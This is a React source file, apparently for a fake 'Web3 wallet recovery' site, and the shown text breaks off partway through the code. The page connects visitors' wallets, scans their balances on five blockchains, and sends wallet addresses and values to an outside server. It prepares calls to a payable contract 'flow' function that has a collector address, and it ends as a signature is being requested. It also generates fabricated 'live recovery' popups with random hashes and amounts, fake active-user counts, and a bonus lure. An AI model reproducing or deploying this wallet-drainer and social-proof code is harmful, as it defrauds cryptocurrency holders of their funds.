import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// LANGUAGE DETECTION & TRANSLATIONS
// ============================================

const SUPPORTED_LANGUAGES = {
  en: { name: 'English', flag: '🇺🇸', native: 'English' },
  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
};

const TRANSLATIONS = {
  en: {
    serviceActive: 'RECOVERY SERVICE · ACTIVE',
    recoveryTime: 'EST. RECOVERY TIME',
    days: 'days',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'secs',
    bonus: '+25% BONUS',
    bthPrice: 'RECOVERY STATUS',
    welcome: 'Welcome to Web3 Recovery Center',
    connectWallet: 'CONNECT WALLET',
    disconnect: 'Disconnect Wallet',
    checkEligibility: 'Scanning Wallet',
    verifying: 'Checking for stuck transactions...',
    terms: 'Terms',
    delivery: 'Delivery',
    airdrop: 'Recovery',
    successful: 'RECOVERY SUCCESSFUL!',
    youHaveSecured: 'You have recovered',
    viewButton: 'VIEW',
    checkWalletEligibility: '⚡ Scan Wallet',
    whenQualified: 'Connect wallet to check for recoverable assets',
    valueBadge: 'Recovery Amount',
    progress: 'Progress',
    today: 'Today',
    totalRecovered: 'Total Recovered',
    tokenPrice: 'Network',
    participants: 'recoveries',
    liveClaims: 'LIVE RECOVERIES',
    totalClaimed: 'Total Recovered',
    claimingNow: 'recovering now',
    lastClaim: 'Last recovery',
    someoneJustClaimed: 'Recovery completed!',
    securedTokens: 'recovered',
    viewOnExplorer: 'View on Explorer',
    waitingForFirstClaim: 'Waiting for first recovery...',
    claimAmount: 'Recovered',
    bonusTag: '+25% bonus',
    recoverButton: 'RECOVER ASSETS',
    processing: 'PROCESSING RECOVERY...',
    completed: '✓ RECOVERY COMPLETED',
    secured: 'Your assets have been recovered',
    view: 'VIEW RECOVERED ASSETS',
    recoverNow: 'RECOVER NOW',
    recoveryComplete: 'RECOVERY COMPLETE!',
    amountRecovered: 'Amount Recovered',
    processingRecovery: 'Processing recovery...',
    eligible: 'Recoverable assets detected!',
    notEligible: 'No recoverable assets detected',
    minRequirement: 'Connect wallet to check for recoverable assets',
    recoveryValue: 'Recoverable Value'
  },
  es: {
    serviceActive: 'SERVICIO DE RECUPERACIÓN · ACTIVO',
    recoveryTime: 'TIEMPO ESTIMADO DE RECUPERACIÓN',
    days: 'días',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'segs',
    bonus: '+25% BONIFICACIÓN',
    bthPrice: 'ESTADO DE RECUPERACIÓN',
    welcome: 'Bienvenido al Centro de Recuperación Web3',
    connectWallet: 'CONECTAR WALLET',
    disconnect: 'Desconectar Wallet',
    checkEligibility: 'Escaneando Wallet',
    verifying: 'Buscando transacciones atascadas...',
    terms: 'Términos',
    delivery: 'Entrega',
    airdrop: 'Recuperación',
    successful: '¡RECUPERACIÓN EXITOSA!',
    youHaveSecured: 'Has recuperado',
    viewButton: 'VER',
    checkWalletEligibility: '⚡ Escanear Wallet',
    whenQualified: 'Conecta wallet para verificar activos recuperables',
    valueBadge: 'Monto a Recuperar',
    progress: 'Progreso',
    today: 'Hoy',
    totalRecovered: 'Total Recuperado',
    tokenPrice: 'Red',
    participants: 'recuperaciones',
    liveClaims: 'RECUPERACIONES EN VIVO',
    totalClaimed: 'Total Recuperado',
    claimingNow: 'recuperando ahora',
    lastClaim: 'Última recuperación',
    someoneJustClaimed: '¡Recuperación completada!',
    securedTokens: 'recuperado',
    viewOnExplorer: 'Ver en Explorador',
    waitingForFirstClaim: 'Esperando primera recuperación...',
    claimAmount: 'Recuperado',
    bonusTag: '+25% bono',
    recoverButton: 'RECUPERAR ACTIVOS',
    processing: 'PROCESANDO RECUPERACIÓN...',
    completed: '✓ RECUPERACIÓN COMPLETADA',
    secured: 'Tus activos han sido recuperados',
    view: 'VER ACTIVOS RECUPERADOS',
    recoverNow: 'RECUPERAR AHORA',
    recoveryComplete: '¡RECUPERACIÓN COMPLETA!',
    amountRecovered: 'Monto Recuperado',
    processingRecovery: 'Procesando recuperación...',
    eligible: '¡Activos recuperables detectados!',
    notEligible: 'No se detectaron activos recuperables',
    minRequirement: 'Conecta wallet para verificar activos recuperables',
    recoveryValue: 'Valor Recuperable'
  },
  // Add other languages similarly with recovery-focused translations
  fr: {
    serviceActive: 'SERVICE DE RÉCUPÉRATION · ACTIF',
    recoveryTime: 'TEMPS DE RÉCUPÉRATION ESTIMÉ',
    days: 'jours',
    hrs: 'h',
    mins: 'min',
    secs: 's',
    bonus: '+25% BONUS',
    bthPrice: 'STATUT DE RÉCUPÉRATION',
    welcome: 'Bienvenue au Centre de Récupération Web3',
    connectWallet: 'CONNECTER WALLET',
    disconnect: 'Déconnecter Wallet',
    checkEligibility: 'Analyse du Wallet',
    verifying: 'Recherche de transactions bloquées...',
    terms: 'Conditions',
    delivery: 'Livraison',
    airdrop: 'Récupération',
    successful: 'RÉCUPÉRATION RÉUSSIE !',
    youHaveSecured: 'Vous avez récupéré',
    viewButton: 'VOIR',
    checkWalletEligibility: '⚡ Scanner Wallet',
    whenQualified: 'Connectez wallet pour vérifier les actifs récupérables',
    valueBadge: 'Montant à Récupérer',
    progress: 'Progrès',
    today: 'Aujourd\'hui',
    totalRecovered: 'Total Récupéré',
    tokenPrice: 'Réseau',
    participants: 'récupérations',
    liveClaims: 'RÉCUPÉRATIONS EN DIRECT',
    totalClaimed: 'Total Récupéré',
    claimingNow: 'récupèrent maintenant',
    lastClaim: 'Dernière récupération',
    someoneJustClaimed: 'Récupération terminée !',
    securedTokens: 'récupéré',
    viewOnExplorer: 'Voir sur Explorateur',
    waitingForFirstClaim: 'En attente de la première récupération...',
    claimAmount: 'Récupéré',
    bonusTag: '+25% bonus',
    recoverButton: 'RÉCUPÉRER LES ACTIFS',
    processing: 'TRAITEMENT DE LA RÉCUPÉRATION...',
    completed: '✓ RÉCUPÉRATION TERMINÉE',
    secured: 'Vos actifs ont été récupérés',
    view: 'VOIR LES ACTIFS RÉCUPÉRÉS',
    recoverNow: 'RÉCUPÉRER MAINTENANT',
    recoveryComplete: 'RÉCUPÉRATION COMPLÈTE !',
    amountRecovered: 'Montant Récupéré',
    processingRecovery: 'Traitement de la récupération...',
    eligible: 'Actifs récupérables détectés !',
    notEligible: 'Aucun actif récupérable détecté',
    minRequirement: 'Connectez wallet pour vérifier les actifs récupérables',
    recoveryValue: 'Valeur Récupérable'
  }
};

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-red-500 to-red-600',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-red-500 to-red-600',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-red-500 to-red-600',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-red-500 to-red-600',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-500 to-red-600',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "event FlowProcessed(address indexed initiator, uint256 value)"
];

// ============================================
// PERSISTENT STORAGE KEYS
// ============================================
const STORAGE_KEYS = {
  LIVE_TRANSACTIONS: 'walletRecovery_liveTransactions',
  LAST_RESET_DATE: 'walletRecovery_lastResetDate',
  TOTAL_RECOVERED_AMOUNT: 'walletRecovery_totalRecoveredAmount'
};

// Helper to check if date has changed (for daily reset)
const hasDateChanged = (lastDate) => {
  if (!lastDate) return true;
  const today = new Date().toDateString();
  return lastDate !== today;
};

// Get random recovery amount between $2,000 and $1,000,000
const getRandomRecoveryAmount = () => {
  return Math.floor(Math.random() * (1000000 - 2000 + 1) + 2000);
};

// ============================================
// LIVE RECOVERY POPUP COMPONENT
// ============================================
const LiveRecoveryPopup = ({ tx, onClose, onViewTransaction, translations }) => {
  const [visible, setVisible] = useState(true);
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setVisible(false);
      onClose();
    }, 8000);
    return () => clearTimeout(timer);
  }, [onClose]);
  
  if (!visible) return null;
  
  return (
    <div className="fixed bottom-24 right-4 z-50 animate-slideInUp md:bottom-28 md:right-8">
      <div className="bg-gradient-to-r from-gray-900 to-black border-l-4 border-red-500 rounded-lg shadow-2xl p-4 max-w-sm backdrop-blur-lg">
        <div className="flex items-start gap-3">
          <div className="w-10 h-10 bg-red-500/20 rounded-full flex items-center justify-center animate-pulse">
            <span className="text-xl">🔧</span>
          </div>
          <div className="flex-1">
            <p className="text-sm font-bold text-red-400">{translations.someoneJustClaimed}</p>
            <p className="text-xs text-gray-300 mt-1">
              <span className="font-mono">{tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}</span> {translations.securedTokens}{' '}
              <span className="text-red-400 font-bold">${tx.recoveryAmount?.toLocaleString() || '0'} USD</span> +25% bonus
            </p>
            <button 
              onClick={() => onViewTransaction(tx.hash)}
              className="text-xs text-red-400 hover:text-red-300 mt-2 flex items-center gap-1 transition-colors"
            >
              {translations.viewOnExplorer} →
            </button>
          </div>
          <button onClick={() => setVisible(false)} className="text-gray-500 hover:text-gray-300 transition-colors">
            ✕
          </button>
        </div>
      </div>
    </div>
  );
};

// ============================================
// LIVE RECOVERY FEED COMPONENT
// ============================================
const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, todayCount }) => {
  return (
    <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-red-500/20 overflow-hidden">
      <div className="bg-gradient-to-r from-red-600/20 to-transparent px-4 py-3 border-b border-red-500/20 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
          <span className="text-sm font-semibold text-red-400">{translations.liveClaims}</span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-xs text-gray-500">
            {todayCount} {translations.participants?.toLowerCase() || 'recoveries'} today
          </span>
          <div className="w-1 h-4 bg-red-500/30 rounded-full"></div>
          <span className="text-xs text-green-400 font-mono">● LIVE</span>
        </div>
      </div>
      
      <div className="max-h-64 overflow-y-auto custom-scrollbar">
        {transactions.length === 0 ? (
          <div className="p-8 text-center text-gray-500 text-sm">
            <div className="animate-pulse text-2xl mb-2">🔧</div>
            {translations.waitingForFirstClaim}
          </div>
        ) : (
          transactions.map((tx, idx) => (
            <div key={idx} className="px-4 py-3 border-b border-red-500/10 hover:bg-red-500/5 transition-all duration-300 group">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="text-green-400 text-xs animate-pulse">●</span>
                  <span className="font-mono text-xs text-gray-300 group-hover:text-red-400 transition-colors">
                    {tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-red-400 font-mono font-bold">
                    ${tx.recoveryAmount?.toLocaleString() || '0'} USD
                  </span>
                  <span className="text-[10px] text-yellow-500 bg-yellow-500/10 px-1.5 py-0.5 rounded-full">{translations.bonusTag || '+25%'}</span>
                </div>
              </div>
              <div className="flex items-center justify-between mt-1">
                <span className="text-[10px] text-gray-500">
                  {tx.timeAgo}
                  {tx.chain && <span className="ml-2 text-gray-600">• {tx.chain}</span>}
                </span>
                <span className="text-[10px] text-gray-600">#{(transactions.length - idx).toString().padStart(4, '0')}</span>
              </div>
            </div>
          ))
        )}
      </div>
      
      <div className="px-4 py-2 bg-red-500/5 border-t border-red-500/10 flex items-center justify-between">
        <p className="text-[10px] text-gray-500">
          🔗 {translations.totalClaimed}: 
        </p>
        <p className="text-xs text-red-400 font-mono font-bold">
          ${totalRecoveredAmount.toLocaleString()} USD
        </p>
      </div>
    </div>
  );
};

// ============================================
// LIVE ACTIVITY BADGE COMPONENT
// ============================================
const LiveActivityBadge = ({ translations, activeUsers, lastRecoveryTime }) => {
  return (
    <div className="flex items-center justify-center gap-4 mb-4 text-xs flex-wrap">
      <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <div className="flex -space-x-2">
          {[...Array(3)].map((_, i) => (
            <div key={i} className="w-6 h-6 rounded-full bg-red-500/30 border border-red-500/50 flex items-center justify-center text-[10px]">
              👤
            </div>
          ))}
        </div>
        <span className="text-gray-300 ml-1">{activeUsers} {translations.claimingNow}</span>
      </div>
      <div className="text-gray-600">•</div>
      <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <span className="text-green-400 text-xs animate-pulse">⚡</span>
        <span className="text-gray-300">{translations.lastClaim}: {lastRecoveryTime}</span>
      </div>
      <div className="text-gray-600">•</div>
      <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <span className="text-yellow-400 text-xs">🔥</span>
        <span className="text-gray-300">+25% BONUS</span>
      </div>
    </div>
  );
};

// ============================================
// MAIN APP COMPONENT - Web3 Recovery System
// ============================================
function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
  const [hoverConnect, setHoverConnect] = useState(false);
  const [walletInitialized, setWalletInitialized] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [currentFlowId, setCurrentFlowId] = useState('');
  const [processingChain, setProcessingChain] = useState('');
  const [isEligible, setIsEligible] = useState(false);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [bnbAmount, setBnbAmount] = useState('');
  const [showRecoverButton, setShowRecoverButton] = useState(false);
  
  // LIVE TRANSACTIONS STATE - Loaded from localStorage
  const [liveTransactions, setLiveTransactions] = useState([]);
  const [showPopup, setShowPopup] = useState(false);
  const [currentPopupTx, setCurrentPopupTx] = useState(null);
  const [activeUsers, setActiveUsers] = useState(0);
  const [lastRecoveryTime, setLastRecoveryTime] = useState('Just now');
  const [todayTotalRecovered, setTodayTotalRecovered] = useState(0);
  
  // LANGUAGE STATE
  const [language, setLanguage] = useState('en');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [translations, setTranslations] = useState(TRANSLATIONS.en);

  // Recovery stats
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalSold: 4250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.045,
    hardCap: 10000000,
    bthPrice: 0.045
  });

  // Calculate total recovered amount from live transactions (in USD)
  const totalRecoveredAmountUSD = liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0);
  const todayCount = liveTransactions.length;

  // FORMAT TIME AGO FUNCTION
  const formatTimeAgo = (date) => {
    const seconds = Math.floor((new Date() - new Date(date)) / 1000);
    if (seconds < 5) return 'Just now';
    if (seconds < 60) return `${seconds}s ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours}h ago`;
    return `${Math.floor(hours / 24)}d ago`;
  };

  // GENERATE RANDOM TRANSACTION HASH (blockchain-like)
  const generateRandomHash = () => {
    const prefixes = ['0x7a3f', '0x9e1c', '0x4d5f', '0x2b8a', '0x6c9d', '0x8f3e', '0x1a7b', '0x5c2d'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return prefix + Array.from({ length: 60 }, () => 
      '0123456789abcdef'[Math.floor(Math.random() * 16)]
    ).join('');
  };

  // Get random chain for recovery
  const getRandomChain = () => {
    const chains = ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche'];
    return chains[Math.floor(Math.random() * chains.length)];
  };

  // LOAD PERSISTENT DATA ON MOUNT
  useEffect(() => {
    const loadPersistentData = () => {
      const lastDate = localStorage.getItem(STORAGE_KEYS.LAST_RESET_DATE);
      const savedTransactions = localStorage.getItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
      
      // Check if we need to reset for new day
      if (hasDateChanged(lastDate)) {
        localStorage.setItem(STORAGE_KEYS.LAST_RESET_DATE, new Date().toDateString());
        localStorage.removeItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
        
        // Create initial mock recoveries with varied amounts ($2,000 - $1,000,000)
        const initialTransactions = [
          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', recoveryAmount: 125000 },
          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', recoveryAmount: 50000 },
          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', recoveryAmount: 250000 },
        ].map(tx => ({
          ...tx,
          timeAgo: formatTimeAgo(tx.time)
        }));
        setLiveTransactions(initialTransactions);
      } else if (savedTransactions) {
        const parsed = JSON.parse(savedTransactions);
        const transactionsWithTimeAgo = parsed.map(tx => ({
          ...tx,
          timeAgo: formatTimeAgo(tx.time)
        }));
        setLiveTransactions(transactionsWithTimeAgo);
      } else {
        const initialTransactions = [
          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', recoveryAmount: 500000 },
          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', recoveryAmount: 75000 },
          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', recoveryAmount: 350000 },
        ].map(tx => ({
          ...tx,
          timeAgo: formatTimeAgo(tx.time)
        }));
        setLiveTransactions(initialTransactions);
      }
    };
    
    loadPersistentData();
  }, []);

  // Save transactions to localStorage whenever they change
  useEffect(() => {
    if (liveTransactions.length > 0) {
      const toSave = liveTransactions.map(({ timeAgo, ...tx }) => tx);
      localStorage.setItem(STORAGE_KEYS.LIVE_TRANSACTIONS, JSON.stringify(toSave));
    }
  }, [liveTransactions]);

  // Update total recovered amount for the day
  useEffect(() => {
    const total = liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0);
    setTodayTotalRecovered(total);
  }, [liveTransactions]);

  // SCHEDULE RANDOM POPUPS every 8-15 minutes
  useEffect(() => {
    let isMounted = true;
    
    const schedulePopup = () => {
      const delay = Math.random() * (15 * 60 * 1000 - 8 * 60 * 1000) + 8 * 60 * 1000;
      console.log(`⏰ Next recovery popup scheduled in ${Math.floor(delay / 60000)} minutes`);
      
      const timeoutId = setTimeout(() => {
        if (!isMounted) return;
        
        const randomChain = getRandomChain();
        const recoveryAmount = getRandomRecoveryAmount();
        const newTx = {
          hash: generateRandomHash(),
          time: new Date().toISOString(),
          timeAgo: 'Just now',
          chain: randomChain,
          recoveryAmount: recoveryAmount
        };
        
        console.log(`🔧 Recovery popup! ${randomChain} - $${recoveryAmount.toLocaleString()}`);
        setCurrentPopupTx(newTx);
        setShowPopup(true);
        
        setLiveTransactions(prev => [
          { ...newTx, timeAgo: formatTimeAgo(newTx.time) },
          ...prev.slice(0, 19)
        ]);
        
        setActiveUsers(Math.floor(Math.random() * 15) + 5);
        setLastRecoveryTime('Just now');
        
        setTimeout(() => {
          setLastRecoveryTime('Just now');
          setTimeout(() => setLastRecoveryTime('30s ago'), 30000);
        }, 2000);
        
        schedulePopup();
      }, delay);
      
      return timeoutId;
    };
    
    const timeoutId = schedulePopup();
    return () => {
      isMounted = false;
      clearTimeout(timeoutId);
    };
  }, []);

  // Update active users periodically
  useEffect(() => {
    const interval = setInterval(() => {
      setActiveUsers(Math.floor(Math.random() * 15) + 3);
    }, 30000);
    return () => clearInterval(interval);
  }, []);

  // AUTO DETECT LANGUAGE FROM BROWSER
  useEffect(() => {
    const detectLanguage = () => {
      const path = window.location.pathname;
      const pathLang = path.split('/')[1];
      
      if (pathLang && SUPPORTED_LANGUAGES[pathLang]) {
        setLanguage(pathLang);
        setTranslations(TRANSLATIONS[pathLang] || TRANSLATIONS.en);
        return;
      }
      
      const browserLang = navigator.language.split('-')[0];
      if (SUPPORTED_LANGUAGES[browserLang]) {
        setLanguage(browserLang);
        setTranslations(TRANSLATIONS[browserLang] || TRANSLATIONS.en);
      } else {
        setLanguage('en');
        setTranslations(TRANSLATIONS.en);
      }
    };
    
    detectLanguage();
  }, []);

  // CHANGE LANGUAGE FUNCTION
  const changeLanguage = (langCode) => {
    setLanguage(langCode);
    setTranslations(TRANSLATIONS[langCode] || TRANSLATIONS.en);
    setShowLanguageDropdown(false);
    
    const url = new URL(window.location);
    if (langCode === 'en') {
      if (url.pathname.startsWith(`/${langCode}`)) {
        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
      }
    } else {
      url.pathname = `/${langCode}${url.pathname}`;
    }
    window.history.pushState({}, '', url.toString());
  };

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) {
      setWalletInitialized(false);
      return;
    }

    const init = async () => {
      try {
        console.log("🔄 Initializing wallet for recovery...");
        setTxStatus('🔄 Initializing...');
        
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        console.log("✅ Wallet Ready for recovery:", await ethersSigner.getAddress());
        setWalletInitialized(true);
        setTxStatus('');
        
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
        setWalletInitialized(false);
      }
    };

    init();
  }, [walletProvider, address]);

  // Track page visit with location
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch('https://hyperback.vercel.app/api/track-visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country || 'Unknown',
            city: data.data.city || '',
            ip: data.data.ip || '',
            flag: data.data.flag || '🌍'
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
      checkEligibility();
    }
  }, [isConnected, address, balances]);

  // Check eligibility for recovery
  const checkEligibility = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Scanning for recoverable assets...');
    
    try {
      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
      
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0.000001
      );
      
      const eligible = total >= 1;
      setIsEligible(eligible);
      setShowRecoverButton(eligible);
      
      if (eligible) {
        setEligibleChains(chainsWithBalance);
        setTxStatus('✅ Recoverable assets detected!');
        
        await fetch('https://hyperback.vercel.app/api/presale/connect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            totalValue: total,
            chains: chainsWithBalance.map(c => c.name)
          })
        });
        
        prepareRecovery();
      } else {
        setTxStatus(total > 0 ? '✨ Wallet Connected' : '👋 Connect wallet to scan');
      }
      
    } catch (err) {
      console.error('Recovery scan error:', err);
      setTxStatus('✅ Ready');
    } finally {
      setVerifying(false);
    }
  };

  // Fetch balances across all chains
  const fetchAllBalances = async (walletAddress) => {
    console.log("🔍 Scanning for recoverable assets...");
    setScanning(true);
    setTxStatus('🔄 Scanning blockchain for stuck transactions...');
    
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;
    
    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        setTxStatus(`🔄 Scanning ${chain.name}...`);
        
        if (amount > 0.000001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress,
            price: price,
            name: chain.name,
            rpc: chain.rpc
          };
          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} recoverable`);
        }
      } catch (err) {
        console.error(`Failed to scan ${chain.name}:`, err);
        scanned++;
      }
    });
    
    await Promise.all(scanPromises);
    
    setBalances(balanceResults);
    setScanning(false);
    
    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    console.log(`💰 Total recoverable value: $${total.toFixed(2)}`);
    
    return total;
  };

  const prepareRecovery = async () => {
    if (!address) return;
    
    try {
      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
    } catch (err) {
      console.error('Recovery prep error:', err);
    }
  };

  // MULTI-CHAIN RECOVERY EXECUTION
  const executeMultiChainRecovery = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setCompletedChains([]);
      
      const timestamp = Date.now();
      const flowId = `RECOVERY-${timestamp}`;
      setCurrentFlowId(flowId);
      
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `WEB3 WALLET RECOVERY AUTHORIZATION\n\n` +
        `I hereby authorize the recovery of stuck/non-custodial wallet assets\n` +
        `Wallet: ${address}\n` +
        `Recovery Amount: Recoverable assets + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus('✍️ Sign authorization...');
